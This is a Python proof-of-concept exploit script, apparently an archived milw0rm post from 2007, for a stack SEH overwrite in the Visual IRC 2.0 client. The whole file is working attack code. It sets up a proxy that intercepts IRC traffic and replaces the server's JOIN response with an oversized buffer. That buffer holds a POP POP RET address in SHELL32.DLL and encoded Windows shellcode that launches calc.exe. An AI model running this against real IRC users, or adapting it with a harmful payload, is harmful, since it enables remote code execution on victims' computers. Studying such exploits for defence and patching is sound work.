#!/usr/bin/python
# ViRC 2.0 'JOIN Response' 0day Remote SEH Overwrite PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Visual IRC 2.0 / 2k SP4 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# How stuff works ? ..
#
# [ViRC] -----> (..JOIN..) -------------> [exploit_tunnel] -----------------------------> [Real IRC server]
# [ViRC] <--- (#channel :AAAAAAA...) <--- [exploit_tunnel] <---- (#channel :nick) <------ [Real IRC server]
#
# Details:
# "#channel :" + "A" * 4116
# 0x41414141  Pointer to next SEH record
# 0x41414141  SE handler
##

from thread import start_new_thread
from struct import pack
from string import find
from string import join
from socket import *

LEN_RECV = 65536

in_addr = '0.0.0.0'        # local address
in_port = 6667             # local port
out_addr = '192.168.0.2'   # address of IRC server
out_port = 6667            # port of IRC server

shellcode = (
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x7CEA41D3       # POP POP RET (SHELL32.DLL / 2k SP4 Polish)

buf = "A" * 4108
buf += pack("<L", NEXT_SEH_RECORD)
buf += pack("<L", SE_HANDLER)
buf += "\x90" * 32
buf += shellcode

class new_plug_in:
   def __init__(self):
       self.sock = 0
       self.send_to = 1
       self.active = 1
       self.plugins = []
       self.description = ''

   def CloseTunnel(self):
       if(self.active == 1):
           self.active = 0
           self.sock.shutdown(1)
           self.sock.close()
           self.plugins[self.send_to].active = 0
           self.plugins[self.send_to].sock.shutdown(1)
           self.plugins[self.send_to].sock.close()

   def Send(self, data):
       try:
           self.sock.send(data)
       except:
           self.CloseTunnel()

   def Recv(self):
       while(1):
           try:
               data = self.sock.recv(LEN_RECV)
               if(len(data) == 0):
                   self.CloseTunnel()
                   return
               print self.description
               print data
               if(self.description == '[SERVER]'):
                   if(find(data, 'JOIN') != -1):
                       data = build_evil_buf(data, buf)
                       if(data == -1):
                           print "Error: Malformed IRC response"
                           self.CloseTunnel()
               self.plugins[self.send_to].Send(data)
           except:
               self.CloseTunnel()
               return

   def Run(self):
       if(len(self.plugins) == 0):
           self.plugins.append(self)
           try:
               s = socket(AF_INET, SOCK_STREAM)
               s.connect((out_addr, out_port))
           except:
               s.close()
               self.sock.close()
               return
           tunnel_out = new_plug_in()
           tunnel_out.sock = s
           tunnel_out.send_to = 0
           self.plugins.append(tunnel_out)
           self.description = '[CLIENT]'
           tunnel_out.description = '[SERVER]'
           tunnel_out.plugins = self.plugins
           tunnel_out.Run()
       start_new_thread(self.Recv, ())

def build_evil_buf(data, buf):
   try:
       lines = data.split('\r\n')
       tmp = lines[1].split('\x20:')
       tmp[1] = buf
       lines[1] = join(tmp, "\x20:")
       return join(lines, "\r\n")
   except:
       return -1

def AcceptConnect(cl, addr):
   print "Connection accepted from: %s" % (addr[0])
   tunnel_in = new_plug_in()
   tunnel_in.sock = cl
   tunnel_in.Run()

def InitServer(bind_addr, bind_port):
   s = socket(AF_INET, SOCK_STREAM)
   s.bind((bind_addr, bind_port))
   print "Listening on %s:%d..." % (bind_addr, bind_port)
   s.listen(1)
   while(1):
       cl, addr = s.accept()
       start_new_thread(AcceptConnect, (cl, addr,))
   s.close()

InitServer(in_addr, in_port)

# EoF

# milw0rm.com [2007-07-06]